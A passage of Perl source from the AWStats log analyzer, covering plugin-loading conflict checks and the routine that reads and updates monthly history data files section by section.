functions';\n\t\t\t\t\t\t}\n\t\t\t\t\t\tif ( !$initret || $initret =~ /^error/i ) {\n\n\t\t\t\t\t\t\t# Init function failed, we stop here\n\t\t\t\t\t\t\terror(\n\"Plugin init for plugin '$pluginname' failed with return code: \"\n\t\t\t\t\t\t\t\t  . (\n\t\t\t\t\t\t\t\t\t$initret\n\t\t\t\t\t\t\t\t\t? \"$initret\"\n\t\t\t\t\t\t\t\t\t: \"$@ (A module required by plugin might be missing).\"\n\t\t\t\t\t\t\t\t  )\n\t\t\t\t\t\t\t);\n\t\t\t\t\t\t}\n\n\t\t\t\t\t\t# Plugin load and init successful\n\t\t\t\t\t\tforeach my $elem ( split( /\\s+/, $initret ) ) {\n\n\t\t\t\t\t\t\t# Some functions can only be plugged once\n\t\t\t\t\t\t\tmy @uniquefunc = (\n\t\t\t\t\t\t\t\t'GetCountryCodeByName',\n\t\t\t\t\t\t\t\t'GetCountryCodeByAddr',\n\t\t\t\t\t\t\t\t'ChangeTime',\n\t\t\t\t\t\t\t\t'GetTimeZoneTitle',\n\t\t\t\t\t\t\t\t'GetTime',\n\t\t\t\t\t\t\t\t'SearchFile',\n\t\t\t\t\t\t\t\t'LoadCache',\n\t\t\t\t\t\t\t\t'SaveHash',\n\t\t\t\t\t\t\t\t'ShowMenu'\n\t\t\t\t\t\t\t);\n\t\t\t\t\t\t\tmy $isuniquefunc = 0;\n\t\t\t\t\t\t\tforeach my $function (@uniquefunc) {\n\t\t\t\t\t\t\t\tif ( \"$elem\" eq \"$function\" ) {\n\n\t# We try to load a 'unique' function, so we check and stop if already loaded\n\t\t\t\t\t\t\t\t\tforeach my $otherpluginname (\n\t\t\t\t\t\t\t\t\t\tkeys %{ $PluginsLoaded{\"$elem\"} } )\n\t\t\t\t\t\t\t\t\t{\n\t\t\t\t\t\t\t\t\t\terror(\n\"Conflict between plugin '$pluginname' and '$otherpluginname'. They both implements the 'must be unique' function '$elem'.\\nYou must choose between one of them. Using together is not possible.\"\n\t\t\t\t\t\t\t\t\t\t);\n\t\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t\t\t$isuniquefunc = 1;\n\t\t\t\t\t\t\t\t\tlast;\n\t\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif ($isuniquefunc) {\n\n\t\t\t   # TODO Use $PluginsLoaded{\"$elem\"}=\"$pluginname\"; for unique func\n\t\t\t\t\t\t\t\t$PluginsLoaded{\"$elem\"}{\"$pluginname\"} = 1;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\telse { $PluginsLoaded{\"$elem\"}{\"$pluginname\"} = 1; }\n\t\t\t\t\t\t\tif ( \"$elem\" =~ /SectionInitHashArray/ ) {\n\t\t\t\t\t\t\t\t$AtLeastOneSectionPlugin = 1;\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t\t$PluginsLoaded{'init'}{\"$pluginname\"} = 1;\n\t\t\t\t\t\tif ($Debug) {\n\t\t\t\t\t\t\tdebug(\n\" Plugin '$pluginname' now hooks functions '$initret'\",\n\t\t\t\t\t\t\t\t1\n\t\t\t\t\t\t\t);\n\t\t\t\t\t\t}\n\t\t\t\t\t\tlast;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tif ( !$PluginsLoaded{'init'}{\"$pluginname\"} ) {\n\t\t\t\t\terror(\n\"AWStats config file contains a directive to load plugin \\\"$pluginname\\\" (LoadPlugin=\\\"$plugininfo\\\") but AWStats can't open plugin file \\\"$pluginfile.pm\\\" for read.\\nCheck if file is in \\\"\"\n\t\t\t\t\t\t  . ( $PossiblePluginsDir[0] )\n\t\t\t\t\t\t  . \"\\\" directory and is readable.\" );\n\t\t\t\t}\n\t\t\t}\n\t\t\telse {\n\t\t\t\twarning(\n\"Warning: Tried to load plugin \\\"$pluginname\\\" twice. Fix config file.\"\n\t\t\t\t);\n\t\t\t}\n\t\t}\n\t\telse {\n\t\t\terror(\"Plugin \\\"$pluginfile\\\" is not a valid plugin name.\");\n\t\t}\n\t}\n\n# In output mode, geo ip plugins are not loaded, so message changes are done here (can't be done in plugin init function)\n\tif (   $PluginsLoaded{'init'}{'geoip'}\n\t\t|| $PluginsLoaded{'init'}{'geoip6'}\n\t\t|| $PluginsLoaded{'init'}{'geoipfree'} )\n\t{\n\t\t$Message[17] = $Message[25] = $Message[148];\n\t}\n}\n\n#------------------------------------------------------------------------------\n# Function:\t\tRead history file and create or update tmp history file\n# Parameters:\tyear,month,day,hour,withupdate,withpurge,part_to_load[,lastlinenb,lastlineoffset,lastlinechecksum]\n# Input:\t\t$DirData $PROG $FileSuffix $LastLine $DatabaseBreak\n# Output:\t\tNone\n# Return:\t\tTmp history file name created/updated or '' if withupdate is 0\n#------------------------------------------------------------------------------\nsub Read_History_With_TmpUpdate {\n\n\tmy $year  = sprintf( \"%04i\", shift || 0 );\n\tmy $month = sprintf( \"%02i\", shift || 0 );\n\tmy $day   = shift;\n\tif ( $day ne '' ) { $day = sprintf( \"%02i\", $day ); }\n\tmy $hour = shift;\n\tif ( $hour ne '' ) { $hour = sprintf( \"%02i\", $hour ); }\n\tmy $withupdate = shift || 0;\n\tmy $withpurge  = shift || 0;\n\tmy $part       = shift || '';\n\n\tmy ( $date, $filedate ) = ( '', '' );\n\tif ( $DatabaseBreak eq 'month' ) {\n\t\t$date     = sprintf( \"%04i%02i\", $year,  $month );\n\t\t$filedate = sprintf( \"%02i%04i\", $month, $year );\n\t}\n\telsif ( $DatabaseBreak eq 'year' ) {\n\t\t$date     = sprintf( \"%04i%\", $year );\n\t\t$filedate = sprintf( \"%04i\",  $year );\n\t}\n\telsif ( $DatabaseBreak eq 'day' ) {\n\t\t$date     = sprintf( \"%04i%02i%02i\", $year,  $month, $day );\n\t\t$filedate = sprintf( \"%02i%04i%02i\", $month, $year,  $day );\n\t}\n\telsif ( $DatabaseBreak eq 'hour' ) {\n\t\t$date     = sprintf( \"%04i%02i%02i%02i\", $year,  $month, $day, $hour );\n\t\t$filedate = sprintf( \"%02i%04i%02i%02i\", $month, $year,  $day, $hour );\n\t}\n\n\tmy $xml   = ( $BuildHistoryFormat eq 'xml' ? 1 : 0 );\n\tmy $xmleb = '</table><nu>';\n\tmy $xmlrb = '<tr><td>';\n\n\tmy $lastlinenb       = shift || 0;\n\tmy $lastlineoffset   = shift || 0;\n\tmy $lastlinechecksum = shift || 0;\n\n\tmy %allsections = (\n\t\t'general'               => 1,\n\t\t'misc'                  => 2,\n\t\t'time'                  => 3,\n\t\t'visitor'               => 4,\n\t\t'day'                   => 5,\n\t\t'domain'                => 6,\n\t\t'cluster'               => 7,\n\t\t'login'                 => 8,\n\t\t'robot'                 => 9,\n\t\t'worms'                 => 10,\n\t\t'emailsender'           => 11,\n\t\t'emailreceiver'         => 12,\n\t\t'session'               => 13,\n\t\t'sider'                 => 14,\n\t\t'filetypes'             => 15,\n\t\t'downloads'\t\t\t\t=> 16,\n\t\t'os'                    => 17,\n\t\t'browser'               => 18,\n\t\t'screensize'            => 19,\n\t\t'unknownreferer'        => 20,\n\t\t'unknownrefererbrowser' => 21,\n\t\t'origin'                => 22,\n\t\t'sereferrals'           => 23,\n\t\t'pagerefs'              => 24,\n\t\t'searchwords'           => 25,\n\t\t'keywords'              => 26,\n\t\t'errors'                => 27,\n\t);\n\n\tmy $order = ( scalar keys %allsections ) + 1;\n\tforeach ( keys %TrapInfosForHTTPErrorCodes ) {\n\t\t$allsections{\"sider_$_\"} = $order++;\n\t}\n\tforeach ( 1 .. @ExtraName - 1 ) { $allsections{\"extra_$_\"} = $order++; }\n\tforeach ( keys %{ $PluginsLoaded{'SectionInitHashArray'} } ) {\n\t\t$allsections{\"plugin_$_\"} = $order++;\n\t}\n\tmy $withread = 0;\n\n\t# Variable used to read old format history files\n\tmy $readvisitorforbackward = 0;\n\n\tif ($Debug) {\n\t\tdebug(\n\"Call to Read_History_With_TmpUpdate [$year,$month,$day,$hour,withupdate=$withupdate,withpurge=$withpurge,part=$part,lastlinenb=$lastlinenb,lastlineoffset=$lastlineoffset,lastlinechecksum=$lastlinechecksum]\"\n\t\t);\n\t}\n\tif ($Debug) { debug(\"date=$date\"); }\n\n\t# Define SectionsToLoad (which sections to load)\n\tmy %SectionsToLoad = ();\n\tif ( $part eq 'all' ) {    # Load all needed sections\n\t\tmy $order = 1;\n\t\t$SectionsToLoad{'general'} = $order++;\n\n\t\t# When\n\t\t$SectionsToLoad{'time'} = $order\n\t\t  ++; # Always loaded because needed to count TotalPages, TotalHits, TotalBandwidth\n\t\tif (   $UpdateStats\n\t\t\t|| $MigrateStats\n\t\t\t|| ( $HTMLOutput{'main'} && $ShowHostsStats )\n\t\t\t|| $HTMLOutput{'allhosts'}\n\t\t\t|| $HTMLOutput{'lasthosts'}\n\t\t\t|| $HTMLOutput{'unknownip'} )\n\t\t{\n\t\t\t$SectionsToLoad{'visitor'} = $order++;\n\t\t}     # Must be before day, sider and session section\n\t\tif (\n\t\t\t   $UpdateStats\n\t\t\t|| $MigrateStats\n\t\t\t|| ( $HTMLOutput{'main'}\n\t\t\t\t&& ( $ShowDaysOfWeekStats || $ShowDaysOfMonthStats ) )\n\t\t\t|| $HTMLOutput{'alldays'}\n\t\t  )\n\t\t{\n\t\t\t$SectionsToLoad{'day'} = $order++;\n\t\t}\n\n\t\t# Who\n\t\tif (   $UpdateStats\n\t\t\t|| $MigrateStats\n\t\t\t|| ( $HTMLOutput{'main'} && $ShowDomainsStats )\n\t\t\t|| $HTMLOutput{'alldomains'} )\n\t\t{\n\t\t\t$SectionsToLoad{'domain'} = $order++;\n\t\t}\n\t\tif (   $UpdateStats\n\t\t\t|| $MigrateStats\n\t\t\t|| ( $HTMLOutput{'main'} && $ShowAuthenticatedUsers )\n\t\t\t|| $HTMLOutput{'alllogins'}\n\t\t\t|| $HTMLOutput{'lastlogins'} )\n\t\t{\n\t\t\t$SectionsToLoad{'login'} = $order++;\n\t\t}\n\t\tif (   $UpdateStats\n\t\t\t|| $MigrateStats\n\t\t\t|| ( $HTMLOutput{'main'} && $ShowRobotsStats )\n\t\t\t|| $HTMLOutput{'allrobots'}\n\t\t\t|| $HTMLOutput{'lastrobots'} )\n\t\t{\n\t\t\t$SectionsToLoad{'robot'} = $order++;\n\t\t}\n\t\tif (   $UpdateStats\n\t\t\t|| $MigrateStats\n\t\t\t|| ( $HTMLOutput{'main'} && $ShowWormsStats )\n\t\t\t|| $HTMLOutput{'allworms'}\n\t\t\t|| $HTMLOutput{'lastworms'} )\n\t\t{\n\t\t\t$SectionsToLoad{'worms'} = $order++;\n\t\t}\n\t\tif (   $UpdateStats\n\t\t\t|| $MigrateStats\n\t\t\t|| ( $HTMLOutput{'main'} && $ShowEMailSenders )\n\t\t\t|| $HTMLOutput{'allemails'}\n\t\t\t|| $HTMLOutput{'lastemails'} )\n\t\t{\n\t\t\t$SectionsToLoad{'emailsender'} = $order++;\n\t\t}\n\t\tif (   $UpdateStats\n\t\t\t|| $MigrateStats\n\t\t\t|| ( $HTMLOutput{'main'} && $ShowEMailReceivers )\n\t\t\t|| $HTMLOutput{'allemailr'}\n\t\t\t|| $HTMLOutput{'lastemailr'} )\n\t\t{\n\t\t\t$SectionsToLoad{'emailreceiver'} = $order++;\n\t\t}\n\n\t\t# Navigation\n\t\tif (   $UpdateStats\n\t\t\t|| $MigrateStats\n\t\t\t|| ( $HTMLOutput{'main'} && $ShowSessionsStats )\n\t\t\t|| $HTMLOutput{'sessions'} )\n\t\t{\n\t\t\t$SectionsToLoad{'session'} = $order++;\n\t\t}\n\t\tif (   $UpdateStats\n\t\t\t|| $MigrateStats\n\t\t\t|| ( $HTMLOutput{'main'} && $ShowPagesStats )\n\t\t\t|| $HTMLOutput{'urldetail'}\n\t\t\t|| $HTMLOutput{'urlentry'}\n\t\t\t|| $HTMLOutput{'urlexit'} )\n\t\t{\n\t\t\t$SectionsToLoad{'sider'} = $order++;\n\t\t}\n\t\tif (   $UpdateStats\n\t\t\t|| $MigrateStats\n\t\t\t|| ( $HTMLOutput{'main'} && $ShowFileTypesStats )\n\t\t\t|| $HTMLOutput{'filetypes'} )\n\t\t{\n\t\t\t$SectionsToLoad{'filetypes'} = $order++;\n\t\t}\n\t\t\n\t\tif ( $UpdateStats \n\t\t    || $MigrateStats \n\t\t    || ($HTMLOutput{'main'} && $ShowDownloadsStats )\n\t\t    || $HTMLOutput{'downloads'} )\n\t\t{\n\t\t\t$SectionsToLoad{'downloads'} = $order++;\n\t\t}\n\t\tif (   $UpdateStats\n\t\t\t|| $MigrateStats\n\t\t\t|| ( $HTMLOutput{'main'} && $ShowOSStats )\n\t\t\t|| $HTMLOutput{'osdetail'} )\n\t\t{\n\t\t\t$SectionsToLoad{'os'} = $order++;\n\t\t}\n\t\tif (   $UpdateStats\n\t\t\t|| $MigrateStats\n\t\t\t|| ( $HTMLOutput{'main'} && $ShowBrowsersStats )\n\t\t\t|| $HTMLOutput{'browserdetail'} )\n\t\t{\n\t\t\t$SectionsToLoad{'browser'} = $order++;\n\t\t}\n\t\tif ( $UpdateStats || $MigrateStats || $HTMLOutput{'unknownos'} ) {\n\t\t\t$SectionsToLoad{'unknownreferer'} = $order++;\n\t\t}\n\t\tif ( $UpdateStats || $MigrateStats || $HTMLOutput{'unknownbrowser'} ) {\n\t\t\t$SectionsToLoad{'unknownrefererbrowser'} = $order++;\n\t\t}\n\t\tif (   $UpdateStats\n\t\t\t|| $MigrateStats\n\t\t\t|| ( $HTMLOutput{'main'} && $ShowScreenSizeStats ) )\n\t\t{\n\t\t\t$SectionsToLoad{'screensize'} = $order++;\n\t\t}\n\n\t\t# Referers\n\t\tif (   $UpdateStats\n\t\t\t|| $MigrateStats\n\t\t\t|| ( $HTMLOutput{'main'} && $ShowOriginStats )\n\t\t\t|| $HTMLOutput{'origin'} )\n\t\t{\n\t\t\t$SectionsToLoad{'origin'} = $order++;\n\t\t}\n\t\tif (   $UpdateStats\n\t\t\t|| $MigrateStats\n\t\t\t|| ( $HTMLOutput{'main'} && $ShowOriginStats )\n\t\t\t|| $HTMLOutput{'refererse'} )\n\t\t{\n\t\t\t$SectionsToLoad{'sereferrals'} = $order++;\n\t\t}\n\t\tif (   $UpdateStats\n\t\t\t|| $MigrateStats\n\t\t\t|| ( $HTMLOutput{'main'} && $ShowOriginStats )\n\t\t\t|| $HTMLOutput{'refererpages'} )\n\t\t{\n\t\t\t$SectionsToLoad{'pagerefs'} = $order++;\n\t\t}\n\t\tif (   $UpdateStats\n\t\t\t|| $MigrateStats\n\t\t\t|| ( $HTMLOutput{'main'} && $ShowKeyphrasesStats )\n\t\t\t|| $HTMLOutput{'keyphrases'}\n\t\t\t|| $HTMLOutput{'keywords'} )\n\t\t{\n\t\t\t$SectionsToLoad{'searchwords'} = $order++;\n\t\t}\n\t\tif ( !$withupdate && $HTMLOutput{'main'} && $ShowKeywordsStats ) {\n\t\t\t$SectionsToLoad{'keywords'} = $order++;\n\t\t}    # If we update, there is no need to load\n\t\t     # Others\n\t\tif (   $UpdateStats\n\t\t\t|| $MigrateStats\n\t\t\t|| ( $HTMLOutput{'main'} && $ShowMiscStats ) )\n\t\t{\n\t\t\t$SectionsToLoad{'misc'} = $order++;\n\t\t}\n\t\tif (\n\t\t\t   $UpdateStats\n\t\t\t|| $MigrateStats\n\t\t\t|| ( $HTMLOutput{'main'}\n\t\t\t\t&& ( $ShowHTTPErrorsStats || $ShowSMTPErrorsStats ) )\n\t\t\t|| $HTMLOutput{'errors'}\n\t\t  )\n\t\t{\n\t\t\t$SectionsToLoad{'errors'} = $order++;\n\t\t}\n\t\tforeach ( keys %TrapInfosForHTTPErrorCodes ) {\n\t\t\tif ( $UpdateStats || $MigrateStats || $HTMLOutput{\"errors$_\"} ) {\n\t\t\t\t$SectionsToLoad{\"sider_$_\"} = $order++;\n\t\t\t}\n\t\t}\n\t\tif (   $UpdateStats\n\t\t\t|| $MigrateStats\n\t\t\t|| ( $HTMLOutput{'main'} && $ShowClusterStats ) )\n\t\t{\n\t\t\t$SectionsToLoad{'cluster'} = $order++;\n\t\t}\n\t\tforeach ( 1 .. @ExtraName - 1 ) {\n\t\t\tif (   $UpdateStats\n\t\t\t\t|| $MigrateStats\n\t\t\t\t|| ( $HTMLOutput{'main'} && $ExtraStatTypes[$_] )\n\t\t\t\t|| $HTMLOutput{\"allextra$_\"} )\n\t\t\t{\n\t\t\t\t$SectionsToLoad{\"extra_$_\"} = $order++;\n\t\t\t}\n\t\t}\n\t\tforeach ( keys %{ $PluginsLoaded{'SectionInitHashArray'} } ) {\n\t\t\tif ( $UpdateStats || $MigrateStats || $HTMLOutput{\"plugin_$_\"} ) {\n\t\t\t\t$SectionsToLoad{\"plugin_$_\"} = $order++;\n\t\t\t}\n\t\t}\n\t}\n\telse {    # Load only required sections\n\t\tmy $order = 1;\n\t\tforeach ( split( /\\s+/, $part ) ) { $SectionsToLoad{$_} = $order++; }\n\t}\n\n\t# Define SectionsToSave (which sections to save)\n\tmy %SectionsToSave = ();\n\tif ($withupdate) {\n\t\tif ( $SectionsToBeSaved eq 'all' ) {\n\t\t\t%SectionsToSave = %allsections;\n\t\t}\n\t\telse {\n\t\t\tmy $order = 1;\n\t\t\tforeach ( split( /\\s+/, $SectionsToBeSaved ) ) {\n\t\t\t\t$SectionsToSave{$_} = $order++;\n\t\t\t}\n\t\t}\n\t}\n\n\tif ($Debug) {\n\t\tdebug(\n\t\t\t\" List of sections marked for load : \"\n\t\t\t  . join(\n\t\t\t\t' ',\n\t\t\t\t(\n\t\t\t\t\tsort { $SectionsToLoad{$a} <=> $SectionsToLoad{$b} }\n\t\t\t\t\t  keys %SectionsToLoad\n\t\t\t\t)\n\t\t\t  ),\n\t\t\t2\n\t\t);\n\t\tdebug(\n\t\t\t\" List of sections marked for save : \"\n\t\t\t  . join(\n\t\t\t\t' ',\n\t\t\t\t(\n\t\t\t\t\tsort { $SectionsToSave{$a} <=> $SectionsToSave{$b} }\n\t\t\t\t\t  keys %SectionsToSave\n\t\t\t\t)\n\t\t\t  ),\n\t\t\t2\n\t\t);\n\t}\n\n# Define value for filetowrite and filetoread (Month before Year kept for backward compatibility)\n\tmy $filetowrite = '';\n\tmy $filetoread  = '';\n\tif ( $HistoryAlreadyFlushed{\"$year$month$day$hour\"}\n\t\t&& -s \"$DirData/$PROG$filedate$FileSuffix.tmp.$$\" )\n\t{\n\n\t\t# tmp history file was already flushed\n\t\t$filetoread  = \"$DirData/$PROG$filedate$FileSuffix.tmp.$$\";\n\t\t$filetowrite = \"$DirData/$PROG$filedate$FileSuffix.tmp.$$.bis\";\n\t}\n\telse {\n\t\t$filetoread  = \"$DirData/$PROG$filedate$FileSuffix.txt\";\n\t\t$filetowrite = \"$DirData/$PROG$filedate$FileSuffix.tmp.$$\";\n\t}\n\tif ($Debug) { debug( \" History file to read is '$filetoread'\", 2 ); }\n\n# Is there an old data file to read or, if migrate, can we open the file for read\n\tif ( -s $filetoread || $MigrateStats ) { $withread = 1; }\n\n\t# Open files\n\tif ($withread) {\n\t\topen( HISTORY, $filetoread )\n\t\t  || error( \"Couldn't open file \\\"$filetoread\\\" for read: $!\",\n\t\t\t\"\", \"\", $MigrateStats );\n\t\tbinmode HISTORY\n\t\t  ; # Avoid premature EOF due to history files corrupted with \\cZ or bin chars\n\t}\n\tif ($withupdate) {\n\t\topen( HISTORYTMP, \">$filetowrite\" )\n\t\t  || error(\"Couldn't open file \\\"$filetowrite\\\" for write: $!\");\n\t\tbinmode HISTORYTMP;\n\t\tif ($xml) {\n\t\t\tprint HISTORYTMP\n'<xml xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:noNamespaceSchemaLocation=\"http://www.awstats.org/files/awstats.xsd\">'\n\t\t\t  . \"\\n\\n\";\n\t\t}\n\t\tSave_History( \"header\", $year, $month, $date );\n\t}\n\n\t# Loop on read file\n\tmy $readxml = 0;\n\tif ($withread) {\n\t\tmy $countlines = 0;\n\t\tmy $versionnum = 0;\n\t\tmy @field      = ();\n\t\twhile (<HISTORY>) {\n\t\t\tchomp $_;\n\t\t\ts/\\r//;\n\t\t\t$countlines++;\n\n\t\t\t# Test if it's xml\n\t\t\tif ( !$readxml && $_ =~ /^<xml/ ) {\n\t\t\t\t$readxml = 1;\n\t\t\t\tif ($Debug) { debug( \" Data file format is 'xml'\", 1 ); }\n\t\t\t\tnext;\n\t\t\t}\n\n\t\t\t# Extract version from first line\n\t\t\tif ( !$versionnum && $_ =~ /^AWSTATS DATA FILE (\\d+).(\\d+)/i ) {\n\t\t\t\t$versionnum = ( $1 * 1000 ) + $2;\n\t\t\t\tif ($Debug) { debug( \" Data file version is $versionnum\", 1 ); }\n\t\t\t\tnext;\n\t\t\t}\n\n\t\t\t# Analyze fields\n\t\t\t@field = split( /\\s+/, ( $readxml ? XMLDecodeFromHisto($_) : $_ ) );\n\t\t\tif ( !$field[0] ) { next; }\n\n\t\t\t# Here version MUST be defined\n\t\t\tif ( $versionnum < 5000 ) {\n\t\t\t\terror(\n\"History file '$filetoread' is to old (version '$versionnum'). This version of AWStats is not compatible with very old history files. Remove this history file or use first a previous AWStats version to migrate it from command line with command: $PROG.$Extension -migrate=\\\"$filetoread\\\".\",\n\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t);\n\t\t\t}\n\n\t\t\t# BEGIN_GENERAL\n\t\t\t# TODO Manage GENERAL in a loop like other sections.\n\t\t\tif ( $field[0] eq 'BEGIN_GENERAL' ) {\n\t\t\t\tif ($Debug) { debug(\" Begin of GENERAL section\"); }\n\t\t\t\tnext;\n\t\t\t}\n\t\t\tif ( $field[0] eq 'LastLine' || $field[0] eq \"${xmlrb}LastLine\" ) {\n\t\t\t\tif ( !$LastLine || $LastLine < int( $field[1] ) ) {\n\t\t\t\t\t$LastLine = int( $field[1] );\n\t\t\t\t}\n\t\t\t\tif ( $field[2] ) { $LastLineNumber   = int( $field[2] ); }\n\t\t\t\tif ( $field[3] ) { $LastLineOffset   = int( $field[3] ); }\n\t\t\t\tif ( $field[4] ) { $LastLineChecksum = int( $field[4] ); }\n\t\t\t\tnext;\n\t\t\t}\n\t\t\tif ( $field[0] eq 'FirstTime' || $field[0] eq \"${xmlrb}FirstTime\" )\n\t\t\t{\n\t\t\t\tif ( !$FirstTime{$date}\n\t\t\t\t\t|| $FirstTime{$date} > int( $field[1] ) )\n\t\t\t\t{\n\t\t\t\t\t$FirstTime{$date} = int( $field[1] );\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\t\t\tif ( $field[0] eq 'LastTime' || $field[0] eq \"${xmlrb}LastTime\" ) {\n\t\t\t\tif ( !$LastTime{$date} || $LastTime{$date} < int( $field[1] ) )\n\t\t\t\t{\n\t\t\t\t\t$LastTime{$date} = int( $field[1] );\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\t\t\tif (   $field[0] eq 'LastUpdate'\n\t\t\t\t|| $field[0] eq \"${xmlrb}LastUpdate\" )\n\t\t\t{\n\t\t\t\tif ( !$LastUpdate ) { $LastUpdate = int( $field[1] ); }\n\t\t\t\tnext;\n\t\t\t}\n\t\t\tif (   $field[0] eq 'TotalVisits'\n\t\t\t\t|| $field[0] eq \"${xmlrb}TotalVisits\" )\n\t\t\t{\n\t\t\t\tif ( !$withupdate ) {\n\t\t\t\t\t$MonthVisits{ $year . $month } += int( $field[1] );\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\t\t\tif (   $field[0] eq 'TotalUnique'\n\t\t\t\t|| $field[0] eq \"${xmlrb}TotalUnique\" )\n\t\t\t{\n\t\t\t\tif ( !$withupdate ) {\n\t\t\t\t\t$MonthUnique{ $year . $month } += int( $field[1] );\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\t\t\tif (   $field[0] eq 'MonthHostsKnown'\n\t\t\t\t|| $field[0] eq \"${xmlrb}MonthHostsKnown\" )\n\t\t\t{\n\t\t\t\tif ( !$withupdate ) {\n\t\t\t\t\t$MonthHostsKnown{ $year . $month } += int( $field[1] );\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\t\t\tif (   $field[0] eq 'MonthHostsUnknown'\n\t\t\t\t|| $field[0] eq \"${xmlrb}MonthHostsUnknown\" )\n\t\t\t{\n\t\t\t\tif ( !$withupdate ) {\n\t\t\t\t\t$MonthHostsUnknown{ $year . $month } += int( $field[1] );\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\t\t\tif (\n\t\t\t\t(\n\t\t\t\t\t   $field[0] eq 'END_GENERAL'\n\t\t\t\t\t|| $field[0] eq \"${xmleb}END_GENERAL\"\n\t\t\t\t)\n\t\t\t  )\n\t\t\t{\n\t\t\t\tif ($Debug) { debug(\" End of GENERAL section\"); }\n\t\t\t\tif ( $MigrateStats && !$BadFormatWarning{ $year . $month } ) {\n\t\t\t\t\t$BadFormatWarning{ $year . $month } = 1;\n\t\t\t\t\twarning(\n\"Warning: You are migrating a file that is already a recent version (migrate not required for files version $versionnum).\",\n\t\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t\t);\n\t\t\t\t}\n\n\t\t\t\tdelete $SectionsToLoad{'general'};\n\t\t\t\tif ( $SectionsToSave{'general'} ) {\n\t\t\t\t\tSave_History( 'general', $year, $month, $date, $lastlinenb,\n\t\t\t\t\t\t$lastlineoffset, $lastlinechecksum );\n\t\t\t\t\tdelete $SectionsToSave{'general'};\n\t\t\t\t}\n\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\tlast;\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\n\t\t\t# BEGIN_MISC\n\t\t\tif ( $field[0] eq 'BEGIN_MISC' ) {\n\t\t\t\tif ($Debug) { debug(\" Begin of MISC section\"); }\n\t\t\t\t$field[0] = '';\n\t\t\t\tmy $count       = 0;\n\t\t\t\tmy $countloaded = 0;\n\t\t\t\tdo {\n\t\t\t\t\tif ( $field[0] ) {\n\t\t\t\t\t\t$count++;\n\t\t\t\t\t\tif ( $SectionsToLoad{'misc'} ) {\n\t\t\t\t\t\t\t$countloaded++;\n\t\t\t\t\t\t\tif ( $field[1] ) {\n\t\t\t\t\t\t\t\t$_misc_p{ $field[0] } += int( $field[1] );\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif ( $field[2] ) {\n\t\t\t\t\t\t\t\t$_misc_h{ $field[0] } += int( $field[2] );\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif ( $field[3] ) {\n\t\t\t\t\t\t\t\t$_misc_k{ $field[0] } += int( $field[3] );\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t$_ = <HISTORY>;\n\t\t\t\t\tchomp $_;\n\t\t\t\t\ts/\\r//;\n\t\t\t\t\t@field =\n\t\t\t\t\t  split( /\\s+/,\n\t\t\t\t\t\t( $readxml ? XMLDecodeFromHisto($_) : $_ ) );\n\t\t\t\t\t$countlines++;\n\t\t\t\t  } until ( $field[0] eq 'END_MISC'\n\t\t\t\t\t  || $field[0] eq \"${xmleb}END_MISC\"\n\t\t\t\t\t  || !$_ );\n\t\t\t\tif (   $field[0] ne 'END_MISC'\n\t\t\t\t\t&& $field[0] ne \"${xmleb}END_MISC\" )\n\t\t\t\t{\n\t\t\t\t\terror(\n\"History file \\\"$filetoread\\\" is corrupted (End of section MISC not found).\\nRestore a recent backup of this file (data for this month will be restored to backup date), remove it (data for month will be lost), or remove the corrupted section in file (data for at least this section will be lost).\",\n\t\t\t\t\t\t\"\", \"\", 1\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tif ($Debug) {\n\t\t\t\t\tdebug(\n\" End of MISC section ($count entries, $countloaded loaded)\"\n\t\t\t\t\t);\n\t\t\t\t}\n\t\t\t\tdelete $SectionsToLoad{'misc'};\n\t\t\t\tif ( $SectionsToSave{'misc'} ) {\n\t\t\t\t\tSave_History( 'misc', $year, $month, $date );\n\t\t\t\t\tdelete $SectionsToSave{'misc'};\n\t\t\t\t\tif ($withpurge) {\n\t\t\t\t\t\t%_misc_p = ();\n\t\t\t\t\t\t%_misc_h = ();\n\t\t\t\t\t\t%_misc_k = ();\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t\tif ( !scalar %SectionsToLoad ) {\n\t\t\t\t\tdebug(\" Stop reading history file. Got all we need.\");\n\t\t\t\t\tlast;\n\t\t\t\t}\n\t\t\t\tnext;\n\t\t\t}\n\n\t\t\t# BEGIN_CLUSTER\n\t\t\tif ( $field[0] eq 'BEGIN_CLUSTER' ) {\n\t\t\t\tif ($Debug) { debug(\" Begin of CLUSTER section\"); }\n\t\t\t\t$field[0] = '';\n\t\t\t\tmy $count       = 0;\n\t\t\t\tmy $countloaded = 0;\n\t\t\t\tdo {\n\t\t\t\t\tif ( $field[0] ) {\n\t\t\t\t\t\t$count++;\n\t\t\t\t\t\tif ( $SectionsToLoad{'cluster'} ) {\n\t\t\t\t\t\t\t$countloaded++;\n\t\t\t\t\t\t\tif ( $field[1] ) {\n\t\t\t\t\t\t\t\t$_cluster_p{ $field[0] } += int( $field[1] );\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif ( $field[2] ) {\n\t\t\t\t\t\t\t\t$_cluster_h{ $field[0] } += int( $field[2] );\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t\tif ( $field[3] ) {\n\t\t\t\t\t\t\t\t$_cluster_k{ $field[0] } += int( $field[3] );\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t$_ = 